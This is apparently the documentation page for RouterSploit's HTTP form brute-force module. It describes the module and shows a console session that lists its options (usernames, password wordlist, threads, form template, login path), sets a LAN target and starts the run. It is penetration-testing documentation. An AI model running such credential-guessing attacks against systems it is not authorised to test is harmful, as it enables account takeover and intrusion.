# HTTP Form Bruteforce

## Description
Module performs bruteforce attack against HTTP form service. If valid credentials are found, they are displayed to the user.

## Authors
* Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module

## Usage
```
rsf > use creds/http_form_bruteforce
rsf (HTTP Form Bruteforce) > show options

Target options:

   Name       Current settings     Description
   ----       ----------------     -----------
   target                          Target IP address or file with target:port (file://)
   port       80                   Target port


Module options:

   Name                Current settings                                                               Description
   ----                ----------------                                                               -----------
   usernames           admin                                                                          Username or file with usernames (file://)
   passwords           file:///Users/lucyoa/git/routersploit/routersploit/wordlists/passwords.txt     Password or file with passwords (file://)
   threads             8                                                                              Number of threads
   form                auto                                                                           Post Data: auto or in form login={{USER}}&password={{PASS}}&submit
   stop_on_success     yes                                                                            Stop on first valid authentication attempt
   path                /login.php                                                                     URL Path
   verbosity           yes                                                                            Display authentication attempts
   form_path           same                                                                           same as path or URL Form Path


rsf (HTTP Form Bruteforce) > set target http://192.168.1.1
[+] {'target': 'http://192.168.1.1'}
rsf (HTTP Form Bruteforce) > run
[*] Running module...
```
